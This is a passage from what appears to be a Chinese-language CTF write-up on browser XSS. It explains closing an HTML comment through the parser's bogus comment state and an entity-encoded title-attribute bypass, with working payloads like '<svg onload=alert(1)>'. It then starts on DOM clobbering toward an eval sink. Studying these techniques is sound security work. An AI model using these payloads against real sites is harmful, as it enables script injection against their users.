class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?&amp;gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?&amp;gt;&amp;lt;a href=javascript:alert(1)&amp;gt;aaa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;只要能闭合注释，后面的基本除了script标签之外可以乱写&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;如果直接闭合，--会被替换，&amp;gt;会被innerhtml转义&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- &amp;lt;p&amp;gt; DEBUG: &amp;lt;template&amp;gt;__&amp;amp;gt;&amp;lt;/template&amp;gt; &amp;lt;/p&amp;gt; --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- --&amp;gt;是多行注释，换行也不行，换行效果： ?debug=%0a&amp;lt;svg/onload=alert(1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- &amp;lt;p&amp;gt; DEBUG: &amp;lt;template&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg_onload=alert(1)&amp;gt;&amp;lt;/svg_onload=alert(1)&amp;gt;&amp;lt;/template&amp;gt; &amp;lt;/p&amp;gt; --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;但如果输入&amp;lt;?&amp;gt;  ?debug=&amp;lt;?&amp;gt;aaaaaaaaaaa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- &amp;lt;p&amp;gt; DEBUG: &amp;lt;template&amp;gt;&amp;lt;!--?--&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aaaaaaaaaaa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--&amp;amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;注释被闭合了，注释后面输入的内容可以逃逸出来&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;在template.innerHTML = input的时候，会解析input，然后使用 HTML parser 解析，根据 W3 文档&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;解析到&amp;lt;的时候，HTML parser 正处于 [data state]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;下一个字符是?，根据文档，HTML parser 会创建一个空的 comment token，进入 [bogus comment state]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;下一个字符是 anything else，会将这个字符插入到刚刚的 comment 中，也就是我们上图看到的&amp;lt;!--?--&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;例如输入是aaa&amp;lt;?bbb&amp;gt;ccc的时候，解析到第 i 个字符时，innerHTML 的结果是这样的&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aaa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aaa&amp;lt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aaa&amp;lt;!--?--&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aaa&amp;lt;!--?b--&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aaa&amp;lt;!--?bb--&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aaa&amp;lt;!--?bbb--&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aaa&amp;lt;!--?bbb--&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aaa&amp;lt;!--?bbb--&amp;gt;c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aaa&amp;lt;!--?bbb--&amp;gt;cc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aaa&amp;lt;!--?bbb--&amp;gt;ccc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;直到该状态遇到了&amp;gt;为止，回到 data state。注意这个 Bogus comment state 解析到&amp;gt;的时候会直接回到 data state，也就是 HTML parser 最开始解析的状态，这个时候我们就可以插入 HTML 代码了。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;我们输入payload后：?debug=aaa&amp;lt;?bbb&amp;gt;ccc&amp;lt;svg%20onload=alert(1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;首先aaa&amp;lt;?bbb&amp;gt;ccc 变为 aaa&amp;lt;!--?bbb--&amp;gt; ccc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- &amp;lt;p&amp;gt; DEBUG: &amp;lt;template&amp;gt;aaa&amp;lt;!--?bbb--&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;ccc&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg onload=&amp;quot;alert(1)&amp;quot;&amp;gt;&amp;lt;/svg&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;成功闭合注释&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;如果题目没有过滤&amp;amp;#时，存在unintended solution&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img title=&amp;quot;&amp;amp;#x2D;&amp;amp;#x2D;&amp;amp;#x3E;&amp;amp;#x3C;&amp;amp;#x73;&amp;amp;#x76;&amp;amp;#x67;&amp;amp;#x2F;&amp;amp;#x6F;&amp;amp;#x6E;&amp;amp;#x6C;&amp;amp;#x6F;&amp;amp;#x61;&amp;amp;#x64;&amp;amp;#x3D;&amp;amp;#x61;&amp;amp;#x6C;&amp;amp;#x65;&amp;amp;#x72;&amp;amp;#x74;&amp;amp;#x28;1&amp;amp;#x29;&amp;amp;#x3E;&amp;quot;&amp;gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;我们可以用html实体编码闭合多行注释&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;但：简单的--&amp;gt;; 并不能闭合,因为第一次的innerHTML会将&amp;gt;进行编码为实体，第二次innerhtml时传入的是--&amp;amp;gt;不能闭合&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- &amp;lt;p&amp;gt; DEBUG: &amp;lt;template&amp;gt;--&amp;amp;gt;&amp;amp;lt;svg/onload=alert()&amp;amp;gt;&amp;lt;/template&amp;gt; &amp;lt;/p&amp;gt; --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;但img标签中title可以绕过，因为第一次HTML parser不会将 title 属性内的字符串进行转义&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg&amp;gt;&amp;lt;b title=&amp;quot;--&amp;gt;&amp;lt;svg/onload=alert()&amp;gt;&amp;quot;&amp;gt;aaa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;最终在html中渲染的是&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- &amp;lt;p&amp;gt; DEBUG: &amp;lt;template&amp;gt;&amp;lt;img title=&amp;quot;--&amp;gt;&amp;lt;svg onload=&amp;quot;alert()&amp;quot;&amp;gt;&amp;quot;&amp;amp;gt;1 &amp;lt;/svg&amp;gt;&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt; --&amp;amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;然后当 HTML parser 解析这段代码时，首先由&amp;lt;!的存在，会进入[Markup declaration open state]，中间的代码&amp;lt;p&amp;gt; DEBUG: &amp;lt;template&amp;gt;&amp;lt;img title=”会让 HTML parser 进入一些其他关于 comment 的状态，这些都无关紧要，最后的–&amp;gt;让 HTML parser 进入到了[Comment End State]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;okboomer&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#okboomer&#34;&gt;#&lt;/a&gt; OK，Boomer&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;前置知识：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.DOM 中内容会影响 Windows&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;button&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;btn&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;click me&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;button&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;info&lt;/span&gt;(&lt;span class=&#34;variable language_&#34;&gt;window&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;btn&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;//&amp;lt;button id=&amp;quot;btn&amp;quot;&amp;gt;click me&amp;lt;/button&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;只需要用 id 同名就可以拿到 html 元素&lt;/p&gt;
&lt;p&gt;也就是说除了  &lt;code&gt;id&lt;/code&gt;  可以直接用  &lt;code&gt;window&lt;/code&gt;  存取， &lt;code&gt;embed&lt;/code&gt; ,  &lt;code&gt;form&lt;/code&gt; ,  &lt;code&gt;img&lt;/code&gt;  和  &lt;code&gt;object&lt;/code&gt;  这四个标签用  &lt;code&gt;name&lt;/code&gt;  也可以操作：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;embed&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;embed&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;b&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;c&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;object&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;object&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;info&lt;/span&gt;(&lt;span class=&#34;variable language_&#34;&gt;window&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;c&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过 html 影响 js&lt;/p&gt;
&lt;p&gt;1) 利用 html 标签的属性 id，很容易在 window 对象上创建任意的属性，但是我们能在新对象上创建新属性吗？&lt;/p&gt;
&lt;p&gt;2) 怎么控制 DOM elements 被强制转为 string 之后的值，大多数的 dom 节点被转为 string 后是 [object HTMLInputElement]。&lt;/p&gt;
&lt;p&gt;关于问题 1)&lt;/p&gt;
&lt;p&gt;最常引用的解决方法是使用 &lt;code&gt;&amp;lt;form&amp;gt;&lt;/code&gt;  标签。标记的每个 &lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt;  都属于 &lt;code&gt;&amp;lt;form&amp;gt;&lt;/code&gt;  后代，该属性 &lt;code&gt;&amp;lt;form&amp;gt;&lt;/code&gt;  引用 &lt;code&gt;name&lt;/code&gt;  属性可以取到 &lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt; 。考虑以下示例：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;form id=test1&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;input name=test2&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  alert(test1.test2); // alerts &amp;quot;[object HTMLInputElement]&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以通过 name 取值，但取到的值是对象，即引出问题 2)&lt;/p&gt;
&lt;p&gt;js 内部会执行两个方法 tovalue,tostring，因为 js 的原型链&lt;/p&gt;
&lt;p&gt;一般来说，对象的 &lt;code&gt;valueof&lt;/code&gt;  方法总是返回对象自身，这时再自动调用对象的 &lt;code&gt;tostring&lt;/code&gt;  方法，将其转为字符串。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;var obj = &amp;#123; p: 1 &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;obj.valueof().tostring() // &amp;quot;[object object]&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;对象的 &lt;code&gt;tostring&lt;/code&gt;  方法默认返回 &lt;code&gt;[object object]&lt;/code&gt; ，所以就得到了最前面那个例子的结果。&lt;/p&gt;
&lt;p&gt;通过遍历 HTML 中所有可能的元素并检查它们的 &lt;code&gt;toString&lt;/code&gt;  方法是否继承自 &lt;code&gt;Object.prototype&lt;/code&gt;  或以另一种方式定义&lt;/p&gt;
&lt;p&gt;一个简短的 JS 代码，它遍历 HTML 中所有可能的元素并检查它们的 &lt;code&gt;toString&lt;/code&gt;  方法是否继承自 &lt;code&gt;Object.prototype&lt;/code&gt;  或以另一种方式定义。如果它们不继承自 &lt;code&gt;Object.prototype&lt;/code&gt; ，那么可能 &lt;code&gt;[object SomeElement]&lt;/code&gt;  会返回其他东西。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Object.getOwnPropertyNames(window)   //获取Window下object所有属性&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.filter(p =&amp;gt; p.match(/Element$/))   //匹配以element结尾的属性&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.map(p =&amp;gt; window[p])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.filter(p =&amp;gt; p &amp;amp;&amp;amp; p.prototype &amp;amp;&amp;amp; p.prototype.toString !== Object.prototype.toString)  //找到不继承object的tostring的元素&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;得到结果 &lt;code&gt;HTMLAreaElement&lt;/code&gt; （ &lt;code&gt;&amp;lt;area&amp;gt;&lt;/code&gt; ）和 &lt;code&gt;HTMLAnchorElement&lt;/code&gt; （ &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; ）这两个元素不继承 tostring 方法&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;  元素的情况下， &lt;code&gt;toString&lt;/code&gt;  只返回一个 &lt;code&gt;href&lt;/code&gt;  属性值。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;a id=test1 href=https://securitum.com&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  alert(test1); // alerts &amp;quot;https://securitum.com&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由于没有继承 tostring 导致弹出的不再是 object htmlinputelement，a 标签可以控制弹出的内容&lt;/p&gt;
&lt;p&gt;但是以下代码&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;if (window.test1.test2) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    eval(&amp;#x27;&amp;#x27;+window.test1.test2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;执行结果为 undefined&lt;/p&gt;
&lt;p&gt;假设有两个 id 一样的元素&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;a id=test1&amp;gt;click!&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;a id=test1&amp;gt;click2!&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过 id 取值，得到 htmlcollection，htmlcollection 可以通过索引取值， &lt;code&gt;window.test1.test1&lt;/code&gt;  实际上是指第一个元素，但无法取到第二个元素&lt;/p&gt;
&lt;p&gt;如果想取到第二个元素，需要给第二个元素加 name 值&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;a id=test1&amp;gt;click!&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;a id=test1 name=test2&amp;gt;click2!&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们可以通过 name 访问第二个 a &lt;code&gt;window.test1.test2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;通过给第二个 a 加 href 控制弹出内容&lt;/p&gt;
